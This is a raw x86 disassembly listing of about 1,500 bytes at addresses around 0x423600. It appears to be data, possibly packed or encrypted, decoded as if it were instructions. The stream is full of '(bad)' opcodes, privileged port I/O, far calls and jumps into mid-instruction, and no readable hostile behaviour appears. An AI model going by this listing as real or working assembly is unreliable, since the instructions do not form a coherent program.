  423601:	data16 mov al,ds:0xccd8314a
  423607:	jbe    0x423663
  423609:	fs ret 0x23b
  42360d:	xchg   esi,eax
  42360e:	out    dx,al
  42360f:	adc    eax,0x7b8150ff
  423614:	pop    ss
  423615:	adc    dh,BYTE PTR [ebx-0x7a]
  423618:	addr16 fld st(6)
  42361b:	sub    dh,bl
  42361d:	add    BYTE PTR ds:0xf0afc9b4,ah
  423623:	and    esi,DWORD PTR [eax+0x46cacf7c]
  423629:	arpl   WORD PTR [ebp-0x5b],sp
  42362c:	outs   dx,BYTE PTR ds:[esi]
  42362d:	rol    BYTE PTR [edx-0x3d],1
  423630:	jo     0x423650
  423632:	add    DWORD PTR [esi+eiz*8-0x5d],0x2b
  423637:	push   edx
  423638:	iret   
  423639:	outs   dx,DWORD PTR ds:[esi]
  42363a:	jbe    0x423620
  42363c:	pop    ss
  42363d:	jecxz  0x4235ca
  42363f:	xor    edi,DWORD PTR [eax-0x3b13cc4d]
  423645:	cmp    eax,0x812998e4
  42364a:	aas    
  42364b:	adc    esp,esi
  42364d:	mov    cs,WORD PTR [ebx+0x9]
  423650:	mov    dl,0x2c
  423652:	pop    es
  423653:	push   ss
  423654:	and    al,0x3d
  423656:	fidiv  DWORD PTR [esi]
  423658:	xor    eax,0x4cdbec3c
  42365d:	inc    ebp
  42365e:	gs loop 0x423638
  423661:	stos   DWORD PTR es:[edi],eax
  423662:	pushw  0x66f8
  423666:	dec    edi
  423667:	add    eax,0x3266d238
  42366c:	or     al,0x14
  42366e:	in     al,0xb5
  423670:	stc    
  423671:	dec    esi
  423672:	repz and BYTE PTR [ecx],bh
  423675:	jne    0x4236ba
  423677:	mov    BYTE PTR [edi],ah
  423679:	mov    WORD PTR [ebp+0x3a],fs
  42367c:	or     al,0x9b
  42367e:	or     edi,DWORD PTR [eax-0x3f49b1f7]
  423684:	popa   
  423685:	jge    0x4236ca
  423687:	call   0x9916:0x3f3cb33c
  42368e:	js     0x4236af
  423690:	outs   dx,BYTE PTR ds:[esi]
  423691:	sub    eax,0x8f7ee6c4
  423696:	xchg   edi,eax
  423697:	mov    dl,0x3
  423699:	sbb    esp,DWORD PTR [edi]
  42369b:	jns    0x423683
  42369d:	xor    DWORD PTR [ecx+0x1e14013d],ebp
  4236a3:	std    
  4236a4:	aad    0x7f
  4236a6:	jo     0x42370a
  4236a8:	in     al,dx
  4236a9:	hlt    
  4236aa:	imul   ecx,edx,0x120214a5
  4236b0:	mov    DWORD PTR [edi+0x56],ebp
  4236b3:	fdivr  DWORD PTR [edi+0x40a38496]
  4236b9:	sar    DWORD PTR [ebx+ebp*4],1
  4236bc:	clc    
  4236bd:	pushf  
  4236be:	dec    ecx
  4236bf:	pop    edi
  4236c0:	pop    edi
  4236c1:	(bad)  
  4236c3:	test   bl,bl
  4236c5:	ds std 
  4236c7:	in     eax,dx
  4236c8:	popf   
  4236c9:	ret    0x1908
  4236cc:	imul   ebp,DWORD PTR [ebx],0xfaa93437
  4236d2:	lds    ebp,FWORD PTR [ebx-0x7]
  4236d5:	dec    esp
  4236d6:	imul   esp,DWORD PTR [ebp+edx*4+0x5cfd4a9e],0xa4013e47
  4236e1:	ins    DWORD PTR es:[edi],dx
  4236e2:	fidiv  WORD PTR [eax+0x0]
	...
  4236f1:	sbb    al,0x66
  4236f3:	in     eax,0x66
  4236f5:	jmp    edi
  4236f7:	lahf   
  4236f8:	jle    0x42374a
  4236fa:	stos   BYTE PTR es:[edi],al
  4236fb:	xchg   BYTE PTR [eax-0x3d706ffc],dh
  423701:	sbb    eax,0xab0001af
  423706:	add    eax,DWORD PTR [eax]
  423708:	add    BYTE PTR [ebx+edx*1-0x67],al
  42370c:	cmp    dl,BYTE PTR [edx-0x2e317ef4]
  423712:	push   ebx
  423713:	cmp    al,0x2d
  423715:	pop    ebp
  423716:	lock jle 0x4236b1
  423719:	out    0xd4,eax
  42371b:	or     al,BYTE PTR [esi-0x7e]
  42371e:	mov    dl,0x87
  423720:	cli    
  423721:	pop    esi
  423722:	addr16 jle 0x423754
  423725:	sahf   
  423726:	je     0x4236af
  423728:	into   
  423729:	pop    ds
  42372a:	xchg   BYTE PTR [esi],al
  42372c:	mov    al,ds:0xf631c580
  423731:	jbe    0x423758
  423733:	fnsave [ebp+0x1b701c7c]
  423739:	lods   al,BYTE PTR ds:[esi]
  42373a:	mov    ebx,0x9e0b978c
  42373f:	mov    cs,esp
  423741:	imul   ecx,ebx,0x7d
  423744:	shld   DWORD PTR [eax],esp,cl
  423747:	ficomp WORD PTR [ebp+0x4a]
  42374a:	mov    ecx,0x448509ac
  42374f:	lods   eax,DWORD PTR ds:[esi]
  423750:	scas   al,BYTE PTR es:[edi]
  423751:	mov    dl,0x69
  423753:	clc    
  423754:	mov    ch,BYTE PTR [eax-0x3f]
  423757:	daa    
  423758:	mov    cl,BYTE PTR [esi]
  42375a:	and    edx,DWORD PTR [ecx]
  42375c:	lods   al,BYTE PTR ds:[esi]
  42375d:	cs fwait
  42375f:	mov    dl,0x44
  423761:	sbb    al,0xaf
  423763:	or     ebx,ebp
  423765:	mov    ch,BYTE PTR [ecx]
  423767:	adc    al,0x33
  423769:	pushf  
  42376a:	ins    DWORD PTR es:[edi],dx
  42376b:	(bad)  
  42376c:	adc    BYTE PTR [ebx+0x12],cl
  42376f:	pop    esi
  423770:	xchg   edi,eax
  423771:	lods   al,BYTE PTR ds:[esi]
  423772:	xor    edx,esi
  423774:	add    BYTE PTR [eax-0x42],0x4c
  423778:	adc    eax,0x8cceb6dc
  42377d:	lea    edi,[ebx+0x41]
  423780:	or     edi,DWORD PTR [ebx-0x69]
  423783:	std    
  423784:	(bad)  
  423785:	fcom   QWORD PTR [ecx-0x6d]
  423788:	pop    ss
  423789:	sbb    eax,0x61c4286b
  42378e:	ins    DWORD PTR es:[edi],dx
  42378f:	ins    BYTE PTR es:[edi],dx
  423790:	sub    esp,DWORD PTR [ecx-0x13]
  423793:	in     al,dx
  423794:	jno    0x423720
  423796:	jecxz  0x423741
  423798:	sub    ch,BYTE PTR [esi-0x1a]
  42379b:	retf   
  42379c:	sbb    eax,0x93178063
  4237a1:	xor    BYTE PTR [edx],0xcb
  4237a4:	mov    dh,0x88
  4237a6:	jno    0x423804
  4237a8:	lods   eax,DWORD PTR ds:[esi]
  4237a9:	sti    
  4237aa:	jae    0x423810
  4237ac:	add    DWORD PTR [esi],edx
  4237ae:	imul   eax,DWORD PTR [ebx+0x2c],0x40a3d52b
  4237b5:	iret   
  4237b6:	pcmpeqb mm7,QWORD PTR [ebx-0x52808e72]
  4237bd:	inc    edi
  4237be:	popa   
  4237bf:	pushf  
  4237c0:	fbld   TBYTE PTR [ebx]
  4237c2:	and    esp,DWORD PTR [eax]
  4237c4:	imul   eax,DWORD PTR ds:[ebx],0xa
  4237c8:	push   edi
  4237c9:	jnp    0x423764
  4237cb:	(bad)  
  4237cd:	jo     0x4237bf
  4237cf:	je     0x4237f8
  4237d1:	xchg   DWORD PTR [edi+0x7467a7e8],ebx
  4237d7:	xchg   edx,eax
  4237d8:	jbe    0x4237a2
  4237da:	lock call DWORD PTR [edx-0x7771546f]
  4237e1:	(bad)  
  4237e2:	cli    
  4237e3:	hlt    
  4237e4:	jg     0x423791
  4237e6:	jae    0x4237ec
  4237e8:	mov    eax,0xa4bf524e
  4237ed:	pop    es
  4237ee:	xchg   DWORD PTR [edi+edx*8-0x3e6e0ac0],edx
  4237f5:	push   esp
  4237f6:	imul   edi,eax,0xd664a357
  4237fc:	neg    cl
  4237fe:	sbb    DWORD PTR [edi-0x1c485367],0x63296ba8
  423808:	je     0x42378b
  42380a:	xor    ebp,DWORD PTR ds:0x63b59b92
  423810:	dec    esp
  423811:	mov    ecx,0x3b1b1a13
  423816:	scas   eax,DWORD PTR es:[edi]
  423817:	pusha  
  423818:	mov    eax,0x50a5be92
  42381d:	daa    
  42381e:	jbe    0x423844
  423820:	jmp    0x423803
  423822:	std    
  423823:	stos   DWORD PTR es:[edi],eax
  423824:	ins    BYTE PTR es:[edi],dx
  423825:	add    eax,0x549918c7
  42382a:	cs cdq 
  42382c:	iret   
  42382d:	loope  0x423817
  42382f:	push   cs
  423830:	aad    0x67
  423832:	xchg   ecx,eax
  423833:	mov    esp,0xf5b3177e
  423838:	xchg   esi,eax
  423839:	fwait
  42383a:	push   eax
  42383b:	outs   dx,BYTE PTR fs:[esi]
  42383d:	mov    ecx,0x265b5d0e
  423842:	(bad)  
  423843:	jo     0x423898
  423845:	xor    eax,0xc0b05b03
  42384a:	iret   
  42384b:	(bad)  
  42384c:	fist   DWORD PTR [esi]
  42384e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42384f:	jecxz  0x4238c4
  423851:	mov    al,0x7b
  423853:	jmp    FWORD PTR [ebx+0x480adaf2]
  423859:	je     0x42383c
  42385b:	cld    
  42385c:	fs into 
  42385e:	scas   eax,DWORD PTR es:[edi]
  42385f:	js     0x423830
  423861:	test   eax,0x4cb833d5
  423866:	jb     0x42389f
  423868:	xlat   BYTE PTR ds:[ebx]
  423869:	sti    
  42386a:	out    dx,eax
  42386b:	jl     0x423803
  42386d:	test   BYTE PTR [edi+0x5],bl
  423870:	xrelease mov BYTE PTR [edi+0x967d486],0x25
  423878:	mov    al,0xa9
  42387a:	daa    
  42387b:	test   eax,0xfacb2179
  423880:	test   BYTE PTR [edx+edi*8+0x49acd5e7],bh
  423887:	ficomp DWORD PTR [edi+0x77]
  42388a:	sbb    BYTE PTR [edx+0x1c],ch
  42388d:	dec    ebp
  42388e:	not    BYTE PTR [eax+eiz*1]
  423891:	imul   esp,DWORD PTR [esi+0x2],0x8f77a305
  423898:	push   edi
  423899:	cmp    cl,BYTE PTR ds:0x99c582af
  42389f:	imul   ebx,DWORD PTR [eax+0x220e2daf],0x8014ee44
  4238a9:	jl     0x4238c4
  4238ab:	daa    
  4238ac:	int3   
  4238ad:	fldenv [ecx+0x7e]
  4238b0:	imul   ebx,DWORD PTR [ebx+eax*8-0x7f0eef07],0xfffffffc
  4238b8:	lock mov ds:0x2444d805,al
  4238be:	xchg   BYTE PTR [ecx+0x4e],bl
  4238c1:	mov    ds,WORD PTR [ecx+0x5ce352e8]
  4238c7:	and    dl,bl
  4238c9:	jl     0x423916
  4238cb:	out    0x0,al
  4238cd:	repnz icebp 
  4238cf:	dec    ecx
  4238d0:	retf   
  4238d1:	inc    ecx
  4238d2:	es int3 
  4238d4:	mov    esp,ebx
  4238d6:	pop    ebx
  4238d7:	and    DWORD PTR [esi+0x161eae5c],ebx
  4238dd:	xchg   ebx,eax
  4238de:	and    al,0x60
  4238e0:	mov    bh,0x47
  4238e2:	mov    edx,DWORD PTR [ecx]
  4238e4:	enter  0x4ff2,0x30
  4238e8:	add    DWORD PTR [ebp+0x46],ebx
  4238eb:	call   0xdf3532c0
  4238f0:	lds    eax,FWORD PTR [esi+ebp*2-0xf]
  4238f4:	dec    edx
  4238f5:	jmp    0xbaf8643b
  4238fa:	add    DWORD PTR [esi],esp
  4238fc:	inc    ebp
  4238fd:	test   eax,0xd31a6e9c
  423902:	xchg   ebp,eax
  423903:	push   ebp
  423904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423905:	mov    eax,DWORD PTR [esi+0x9c9ef21]
  42390b:	mov    dh,0x9b
  42390d:	or     al,0x66
  42390f:	pop    ebx
  423910:	(bad)  
  423911:	cmp    eax,0xe33eed58
  423916:	out    dx,al
  423917:	lea    edx,[edx-0x7aea7276]
  42391d:	add    cl,ah
  42391f:	cmp    edx,ebx
  423921:	pop    esp
  423922:	ds mov edi,0x9634fa36
  423928:	inc    esi
  423929:	loope  0x423989
  42392b:	adc    eax,0x186f9bb6
  423930:	fld    st(5)
  423932:	popf   
  423933:	aaa    
  423934:	ja     0x423958
  423936:	xlat   BYTE PTR ds:[ebx]
  423937:	xchg   ecx,eax
  423938:	aam    0x3d
  42393a:	lock add BYTE PTR [esi+ebp*8],cl
  42393e:	dec    edx
  42393f:	arpl   WORD PTR [eax-0x80],di
  423942:	sbb    ch,BYTE PTR [ebx]
  423944:	ins    DWORD PTR es:[edi],dx
  423945:	xchg   DWORD PTR es:[ebx],edx
  423948:	in     eax,0x6a
  42394a:	add    al,0x6b
  42394c:	pop    ebp
  42394d:	out    dx,eax
  42394e:	dec    ebx
  42394f:	call   0x586e5117
  423954:	call   0x2780:0x2fb0a267
  42395b:	jmp    0xca59:0x52ffa93
  423962:	loopne 0x423929
  423964:	lock and BYTE PTR [edx+edx*1-0x7e08723a],bh
  42396c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42396d:	jae    0x42396a
  42396f:	mov    ebx,0x882dec2d
  423974:	sub    BYTE PTR [ecx+0x7b],ah
  423977:	mov    dl,0x79
  423979:	in     eax,0x72
  42397b:	test   al,0x34
  42397d:	inc    edi
  42397e:	jns    0x42396b
  423980:	sub    ebx,DWORD PTR [ebx+eax*8-0x1f]
  423984:	lock push 0xa565c7a2
  42398a:	xor    eax,0x8ae7eff7
  42398f:	push   edx
  423990:	nop
  423991:	or     eax,0xdca9f350
  423996:	dec    esp
  423997:	sbb    esp,ecx
  423999:	adc    DWORD PTR [ebx-0x56],0x779165ab
  4239a0:	xor    ebp,edi
  4239a2:	mov    al,0x4a
  4239a4:	gs and eax,esp
  4239a7:	xchg   ecx,eax
  4239a8:	iret   
  4239a9:	jno    0x4239ef
  4239ab:	push   ebx
  4239ac:	or     BYTE PTR [edx+0x5f],0x56
  4239b0:	mov    esp,0xbe6425d7
  4239b5:	arpl   WORD PTR [ebx-0x217c0b58],sp
  4239bb:	pop    edi
  4239bc:	gs mov bh,0x8a
  4239bf:	sub    ecx,DWORD PTR [ecx+0x77]
  4239c2:	ret    0xeeba
  4239c5:	push   ecx
  4239c6:	sbb    eax,0xbb015d6a
  4239cb:	lea    ebp,gs:[edi-0x390b2535]
  4239d2:	fist   WORD PTR ds:0x9291bef9
  4239d8:	stos   DWORD PTR es:[edi],eax
  4239d9:	push   ebx
  4239da:	xor    ebp,esp
  4239dc:	sbb    eax,0x5c0f3d30
  4239e1:	into   
  4239e2:	out    0x1d,al
  4239e4:	xchg   BYTE PTR [ebx+eiz*1+0x4b2dfd6],bl
  4239eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239ec:	out    dx,al
  4239ed:	test   bh,bl
  4239ef:	add    BYTE PTR [esi+0x7b],ah
  4239f2:	xchg   esp,eax
  4239f3:	outs   dx,BYTE PTR ds:[esi]
  4239f4:	test   ah,0x4a
  4239f7:	stos   BYTE PTR es:[edi],al
  4239f8:	push   0x72e5536a
  4239fd:	inc    ecx
  4239fe:	es stos DWORD PTR es:[edi],eax
  423a00:	loope  0x423a31
  423a02:	xlat   BYTE PTR ds:[ebx]
  423a03:	ror    cl,1
  423a05:	nop
  423a06:	jge    0x4239df
  423a08:	stos   BYTE PTR es:[edi],al
  423a09:	push   edi
  423a0a:	mov    ebx,0xd0f0ea01
  423a0f:	lods   al,BYTE PTR ds:[esi]
  423a10:	dec    esp
  423a11:	bt     DWORD PTR [ecx],edi
  423a14:	leave  
  423a15:	popa   
  423a16:	out    dx,eax
  423a17:	out    0x24,al
  423a19:	mov    edx,0x81c152b5
  423a1e:	addr16 fwait
  423a20:	sub    eax,0x5c49e848
  423a25:	lds    eax,FWORD PTR [ecx+0x509b08ac]
  423a2b:	dec    ebx
  423a2c:	repz stc 
  423a2e:	cdq    
  423a2f:	inc    esi
  423a30:	clc    
  423a31:	pop    ds
  423a32:	cmp    eax,0xddaf0f55
  423a37:	push   ss
  423a38:	pop    edi
  423a39:	cli    
  423a3a:	inc    edi
  423a3b:	ja     0x4239ca
  423a3d:	adc    DWORD PTR [edi],0xf35b8298
  423a43:	mov    ds:0x5facbb78,al
  423a48:	jno    0x4239d0
  423a4a:	fist   DWORD PTR [ecx]
  423a4c:	pop    esp
  423a4d:	lea    edi,[ecx]
  423a4f:	imul   esi,ebp,0x4e218e52
  423a55:	repnz pop edx
  423a57:	xlat   BYTE PTR ds:[ebx]
  423a58:	(bad)  
  423a59:	ins    DWORD PTR es:[edi],dx
  423a5a:	(bad)  
  423a5b:	xor    eax,0xf2c59a67
  423a60:	pop    ecx
  423a61:	mov    eax,ds:0xcd617c83
  423a66:	mov    eax,0x893146e9
  423a6b:	xchg   BYTE PTR [ecx+0x6ddd238],bl
  423a71:	jmp    0xe8193cb9
  423a76:	sbb    ebp,edi
  423a78:	adc    eax,DWORD PTR [esi-0x75]
  423a7b:	jnp    0x423abe
  423a7d:	ror    eax,1
  423a7f:	call   0xeca8:0x3eca6e2f
  423a86:	dec    edx
  423a87:	mov    BYTE PTR [esi],ah
  423a89:	push   ebx
  423a8a:	cmp    bh,BYTE PTR [ebp+ebp*1+0x59]
  423a8e:	sub    esp,DWORD PTR [ebp+0x5604cdd]
  423a94:	popa   
  423a95:	aaa    
  423a96:	cdq    
  423a97:	rol    BYTE PTR ds:0xd041258c,1
  423a9d:	mov    esi,0xebb0bbd7
  423aa2:	push   es
  423aa3:	xchg   ebx,eax
  423aa4:	adc    ebp,DWORD PTR ds:0x71616dda
  423aaa:	inc    esi
  423aab:	repnz xor ch,BYTE PTR [ebx+edx*2]
  423aaf:	pop    ss
  423ab0:	cdq    
  423ab1:	call   0x427c5b
	...
  423abe:	add    BYTE PTR [eax],al
  423ac0:	add    BYTE PTR [ecx-0x6],cl
  423ac3:	mov    ebx,0xfd4fbb4e
  423ac8:	dec    DWORD PTR [ecx]
  423aca:	mov    WORD PTR ds:[edi-0x34],cs
  423ace:	mov    dl,0xd0
  423ad0:	mov    ds:0x1b2c8,al
  423ad5:	stos   DWORD PTR es:[edi],eax
  423ad6:	add    eax,DWORD PTR [eax]
  423ad8:	add    BYTE PTR [ecx+0x2],cl
  423adb:	add    esi,DWORD PTR [esi+0x6d]
  423ade:	mov    eax,ds:0xea4d5a6f
  423ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ae4:	aas    
  423ae5:	inc    esp
  423ae6:	lock cmc 
  423ae8:	call   0xded870d
  423aed:	add    DWORD PTR es:[edx+0x73cc72a6],eax
  423af4:	shl    DWORD PTR [eax+0x55],cl
  423af7:	out    dx,al
  423af8:	lock fsubp st(3),st
  423afb:	imul   edx,DWORD PTR ds:0xbc42a945,0x6b858cc4
  423b05:	fdivr  QWORD PTR [ecx]
  423b07:	stc    
  423b08:	loop   0x423ac1
  423b0a:	mov    dl,0x2b
  423b0c:	and    dl,BYTE PTR [esi+edx*8-0x2b96d1db]
  423b13:	xchg   edi,eax
  423b14:	bound  eax,QWORD PTR [edx+ebp*2-0x64c5ec74]
  423b1b:	mov    DWORD PTR [ebp+0x76],esi
  423b1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b1f:	xor    al,0xa9
  423b21:	jmp    0x423b7e
  423b23:	or     esi,DWORD PTR [esi-0x1c]
  423b26:	jle    0x423b35
  423b28:	test   bh,al
  423b2a:	dec    edx
  423b2b:	push   edx
  423b2c:	out    0xfa,eax
  423b2e:	lods   eax,DWORD PTR ds:[esi]
  423b2f:	mov    dl,0x8b
  423b31:	sub    ecx,DWORD PTR [ecx+0x79589f66]
  423b37:	call   0x16e9:0xaf16aac
  423b3e:	cmp    DWORD PTR [edi-0x695d8591],edi
  423b44:	sbb    BYTE PTR [esi+0xb],cl
  423b47:	xor    ah,ah
  423b49:	out    0xe4,al
  423b4b:	fcomi  st,st(0)
  423b4d:	xlat   BYTE PTR ds:[ebx]
  423b4e:	sub    ebx,ecx
  423b50:	push   ss
  423b51:	sbb    ah,ah
  423b53:	mov    ch,BYTE PTR [ebx+0x1b6a3bd6]
  423b59:	xchg   dl,dl
  423b5b:	lea    eax,[edi+0x9]
  423b5e:	out    0xbd,al
  423b60:	and    BYTE PTR [esi+0x2f],bh
  423b63:	pop    edi
  423b65:	ficom  WORD PTR [edx+esi*8]
  423b68:	das    
  423b69:	sbb    ecx,0x4a14d19d
  423b6f:	imul   esi,DWORD PTR [esi-0x64],0x68100b35
  423b76:	lods   eax,DWORD PTR ds:[esi]
  423b77:	dec    edx
  423b78:	(bad)  
  423b79:	dec    esp
  423b7a:	sbb    eax,0x18aa904d
  423b7f:	xchg   BYTE PTR [edi],ah
  423b81:	div    DWORD PTR [esi-0x48dcf191]
  423b87:	les    eax,FWORD PTR [ebp-0x4f]
  423b8a:	aaa    
  423b8b:	mov    eax,ds:0xa553192a
  423b90:	ja     0x423b53
  423b92:	sub    DWORD PTR [edx+0x4e],ebp
  423b95:	call   0x6710:0xe56b5761
  423b9c:	scas   eax,DWORD PTR es:[edi]
  423b9d:	xchg   ebp,eax
  423b9e:	or     eax,0x4120b207
  423ba3:	pop    ds
  423ba4:	aad    0x5b
  423ba6:	mov    al,0x20
  423ba8:	ja     0x423b73
  423baa:	cli    
  423bab:	or     eax,ecx
  423bad:	and    DWORD PTR [eax+0x6333689b],edi
  423bb3:	jl     0x423b7c
  423bb5:	ins    DWORD PTR es:[edi],dx
  423bb6:	cmp    dh,ch
  423bb8:	and    BYTE PTR [ecx],bl
  423bba:	fisubr DWORD PTR gs:[ecx]
  423bbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bbe:	nop
  423bbf:	clc    
  423bc0:	(bad)  
  423bc1:	rcr    DWORD PTR [edi-0x50],cl
  423bc4:	jecxz  0x423bd7
  423bc6:	cld    
  423bc7:	outs   dx,DWORD PTR ds:[esi]
  423bc8:	inc    ebx
  423bc9:	add    DWORD PTR [ebp-0x5c797f5d],esi
  423bcf:	sbb    dh,BYTE PTR [eax]
  423bd1:	cmp    dl,BYTE PTR [esi+ecx*1+0x2d]
  423bd5:	sub    al,0x61
  423bd7:	nop
  423bd8:	mov    bh,0x5d
  423bda:	push   ds
  423bdb:	dec    ebp
  423bdc:	stos   DWORD PTR es:[edi],eax
  423bdd:	in     al,dx
  423bde:	xchg   edi,eax
  423bdf:	adc    al,cl
  423be1:	jnp    0x423c5a
  423be3:	out    0x46,al
  423be5:	push   0x26
  423be7:	in     al,0x4b
  423be9:	sbb    eax,0x35420f5
  423bee:	jns    0x423b94
  423bf0:	jle    0x423b8f
  423bf2:	pushf  
  423bf3:	repnz push edx
  423bf5:	xchg   esi,eax
  423bf6:	in     eax,dx
  423bf7:	push   eax
  423bf8:	cld    
  423bf9:	dec    esi
  423bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bfb:	adc    DWORD PTR [eax+0xc],esp
  423bfe:	pop    ebx
  423bff:	outs   dx,BYTE PTR ds:[esi]
  423c00:	sub    BYTE PTR [ecx-0x2ded7853],0x74
  423c07:	mov    ?,edx
  423c09:	int3   
  423c0a:	stos   BYTE PTR es:[edi],al
  423c0b:	inc    ecx
  423c0c:	mov    cl,0xbd
  423c0e:	xchg   ebx,eax
  423c0f:	xchg   ecx,eax
  423c10:	stos   BYTE PTR es:[edi],al
  423c11:	(bad)  
  423c12:	repz add dh,dl
  423c15:	pop    edx
  423c16:	mov    dh,0x97
  423c18:	cli    
  423c19:	xchg   DWORD PTR [ebx],edx
  423c1b:	lock addr16 call 0xa081a35a
  423c22:	stc    
  423c23:	stos   DWORD PTR es:[edi],eax
  423c24:	or     DWORD PTR [ebp+0x4a],esp
  423c27:	aaa    
  423c28:	dec    edi
  423c29:	test   ebp,ecx
  423c2b:	popa   
  423c2c:	imul   DWORD PTR [esi-0x78dcef26]
  423c32:	sti    
  423c33:	test   eax,0x9b8bbf50
  423c38:	mov    ebx,0x1aa37a3f
  423c3d:	lock sub eax,0x1f31f284
  423c43:	in     al,0xbe
  423c45:	inc    edx
  423c46:	loop   0x423c74
  423c48:	and    bl,bh
  423c4a:	ja     0x423c9f
  423c4c:	and    DWORD PTR [ecx+0x25],esi
  423c4f:	test   al,0x89
  423c51:	jb     0x423c53
  423c53:	shr    DWORD PTR [edx+0x26],1
  423c56:	mov    esp,0x88df188f
  423c5b:	stos   DWORD PTR es:[edi],eax
  423c5c:	fdivr  st(3),st
  423c5e:	cli    
  423c5f:	nop
  423c60:	jmp    0x423cb8
  423c62:	ret    0x4546
  423c65:	test   eax,0x682e7488
  423c6a:	push   ebx
  423c6b:	imul   esp,edi,0x45
  423c6e:	hlt    
  423c6f:	mov    ds:0x87dc09dc,eax
  423c74:	mov    ch,0x85
  423c76:	sub    al,0xab
  423c78:	and    al,0x63
  423c7a:	xchg   al,bh
  423c7c:	ficom  WORD PTR [ebx]
  423c7e:	sub    DWORD PTR [ecx-0x28f252c0],0xfe11a966
  423c88:	add    ah,BYTE PTR [edx-0x4e308332]
  423c8e:	jp     0x423c4f
  423c90:	or     BYTE PTR [edi+0x71],bl
  423c93:	stos   DWORD PTR es:[edi],eax
  423c94:	aaa    
  423c95:	dec    ebp
  423c96:	pop    ebx
  423c97:	test   BYTE PTR [edi-0x75],cl
  423c9a:	fstp   QWORD PTR [ebp-0xf67cdd7]
  423ca0:	mov    WORD PTR [ecx],fs
  423ca2:	pusha  
  423ca3:	mov    DWORD PTR [eax+0x68],0x4b2c534
  423caa:	stc    
  423cab:	addr16 pop ebx
  423cad:	fadd   QWORD PTR [edx-0x6855e8b5]
  423cb3:	popa   
  423cb4:	pop    ss
  423cb5:	fs pop eax
  423cb7:	test   eax,0xe327a01e
  423cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cbd:	add    BYTE PTR [ebx-0x5f],cl
  423cc0:	ins    BYTE PTR es:[edi],dx
  423cc1:	and    al,0x8d
  423cc3:	xchg   edx,eax
  423cc4:	mov    esp,0x1bf51c50
  423cc9:	add    ch,BYTE PTR [edi]
  423ccb:	aaa    
  423ccc:	ja     0x423cd9
  423cce:	inc    ebp
  423ccf:	push   es
  423cd0:	sub    edx,0xffffffa5
  423cd3:	(bad)  
  423cd4:	push   esp
  423cd5:	stc    
  423cd6:	and    eax,ebx
  423cd8:	mov    al,ds:0x60e11e06
  423cdd:	outs   dx,DWORD PTR ds:[esi]
  423cde:	cwde   
  423cdf:	pop    ds
  423ce0:	add    DWORD PTR [ebp-0x67],edx
  423ce3:	and    edi,DWORD PTR [edi+0x3e]
  423ce6:	cmp    ecx,edx
  423ce8:	ins    DWORD PTR es:[edi],dx
  423ce9:	aas    
  423cea:	dec    ebx
  423ceb:	jle    0x423d5c
  423ced:	mov    bh,0xcb
  423cef:	mov    dh,0xf1
  423cf1:	jecxz  0x423d72
  423cf3:	adc    ah,ah
  423cf5:	sahf   
  423cf6:	pusha  
  423cf7:	(bad)  
  423cf9:	sub    DWORD PTR [edi+0x7169b042],0xffffffb1
  423d00:	mov    esp,0x81d86ed5
  423d05:	or     eax,0x5e1f2055
  423d0a:	leave  
  423d0b:	dec    ebx
  423d0c:	div    DWORD PTR [eax]
  423d0e:	fstp   TBYTE PTR [edx]
  423d10:	call   FWORD PTR [edx]
  423d12:	push   cs
  423d13:	repz cld 
  423d15:	jns    0x423d05
  423d17:	adc    BYTE PTR [ebp+edi*1-0x101a65a8],0xc2
  423d1f:	and    DWORD PTR [ecx+esi*4+0x20],0xe5cb25f7
  423d27:	cld    
  423d28:	scas   eax,DWORD PTR es:[edi]
  423d29:	xchg   BYTE PTR [ebx-0x5f],bl
  423d2c:	cli    
  423d2d:	outs   dx,DWORD PTR ds:[esi]
  423d2e:	repnz shl WORD PTR [esi-0x263f5472],1
  423d36:	mov    bh,BYTE PTR [edi+eax*2+0x14]
  423d3a:	and    eax,0x8181dd29
  423d3f:	ret    
  423d40:	inc    edx
  423d41:	addr16 pop ss
  423d43:	rcr    BYTE PTR [ebp+0x2],cl
  423d46:	rcr    BYTE PTR [edi+0x45a3d999],0xf4
  423d4d:	sbb    bl,0x8d
  423d50:	not    BYTE PTR fs:[edx+0xd]
  423d54:	stos   DWORD PTR es:[edi],eax
  423d55:	in     al,dx
  423d56:	ror    DWORD PTR [edx],cl
  423d58:	clc    
  423d59:	mov    ebx,0x72dc3f1e
  423d5e:	inc    ebx
  423d5f:	adc    al,0x48
  423d61:	cs jecxz 0x423d32
  423d64:	xchg   esp,eax
  423d65:	jle    0x423d89
  423d67:	jmp    0x99c4a4e7
  423d6c:	inc    ecx
  423d6d:	lods   al,BYTE PTR ds:[esi]
  423d6e:	mov    bl,0xb0
  423d70:	sbb    BYTE PTR [edx+0x23488d9e],bl
  423d76:	push   esi
  423d77:	cmp    BYTE PTR [edi+esi*8],al
  423d7a:	pushf  
  423d7b:	int    0x6f
  423d7d:	cs mov ecx,0xac70f1b7
  423d83:	sub    dh,al
  423d85:	outs   dx,BYTE PTR ds:[esi]
  423d86:	in     al,0x55
  423d88:	pop    ss
  423d89:	out    0x62,eax
  423d8b:	rol    BYTE PTR [edi+eiz*1],cl
  423d8e:	repnz mov bl,0x2f
  423d91:	adc    ebp,DWORD PTR [ebp+0x23]
  423d94:	int    0x38
  423d96:	jns    0x423d3f
  423d98:	adc    eax,0x71489c65
  423d9d:	popf   
  423d9e:	mov    ebx,0xe4d2159c
  423da3:	retf   0x6a8b
  423da6:	scas   al,BYTE PTR es:[edi]
  423da7:	pop    esp
  423da8:	test   eax,0xd9d7c5da
  423dad:	(bad)  
  423dae:	in     al,dx
  423daf:	leave  
  423db0:	rcl    BYTE PTR [edi],0xba
  423db3:	sub    eax,0x8b8ce15
  423db8:	add    al,0x86
  423dba:	retf   0xdc8f
  423dbd:	test   BYTE PTR [ebx+0x3269d690],cl
  423dc3:	fistp  WORD PTR [ecx-0x35ee4229]
  423dc9:	popf   
  423dca:	rol    DWORD PTR [ecx+0x29],1
  423dcd:	pop    edx
  423dce:	lock imul edi,DWORD PTR gs:[edx-0x7dcbd451],0xffffff99
  423dd7:	test   ebx,ebx
  423dd9:	sub    BYTE PTR [bp+si],0x25
